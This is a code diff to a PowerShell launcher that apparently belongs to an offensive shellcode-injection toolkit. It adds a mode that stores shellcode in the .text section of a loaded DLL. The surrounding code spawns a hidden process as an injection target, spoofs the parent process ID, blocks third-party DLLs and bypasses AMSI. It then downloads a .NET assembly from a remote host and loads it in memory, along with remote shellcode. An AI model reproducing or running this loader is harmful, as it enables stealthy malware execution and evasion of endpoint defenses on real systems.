@@ -8,6 +8,7 @@ Module name. Choose from:
   "clipboardpointer",
   "currentthread",
   "remotethread",
+  "remotethreaddll",
   "remotethreadview",
   "remotethreadsuspended",
   "remotethreadapc",
@@ -34,21 +35,24 @@ $F = "Passw0rd!"
 # path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $G = "C:\Windows\System32\svchost.exe"
 
-# existing process name to inject into (used in "remotethread", "remotethreadview" and "remotethreadsuspended")
+# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview" and "remotethreadsuspended")
 $H = "notepad"
 
 # parent process name to spoof the original value (use "0" to disable PPID spoofing)
 $I = "explorer"
 
+# loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
+$J = "msvcp_win.dll"
+
 # block 3rd-party DLLs ("True" / "False")
-$J = "True"
+$K = "True"
 
 # bypass AMSI ("True" / "False")
-$K = "True"
+$L = "True"
 
 # --------------------------------------------------------------------
 
-$methods = @("remotethread", "remotethreadview", "remotethreadsuspended")
+$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
 if ($methods.Contains($A)) {
     $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
@@ -63,7 +67,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /blockDlls:${J} /am51:${K}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /blockDlls:${K} /am51:${L}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
